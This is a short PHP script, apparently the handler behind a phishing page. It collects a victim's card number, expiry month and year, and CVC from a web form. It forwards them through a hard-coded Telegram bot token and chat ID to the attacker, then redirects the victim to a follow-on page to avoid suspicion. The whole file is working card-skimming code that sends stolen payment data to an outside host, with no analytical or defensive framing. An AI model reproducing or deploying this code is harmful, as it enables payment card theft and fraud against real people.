<?php


$carderr = $_POST['carderr'];
$MM = $_POST['MM'];
$GG = $_POST['GG'];
$CVC = $_POST['CVC'];
$token = "6535119944:AAGj3u1rQgvCDIvfnfXGvAsRPr_wAecs4DU";
$chat_id = "-6007133947";
$arr = array(
  'номер карты: ' => $carderr,
  'мес: ' => $MM,
  'год:' => $GG,
  'cvc:' => $CVC
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: index4.html');
} else {
  echo "Error";
}
?>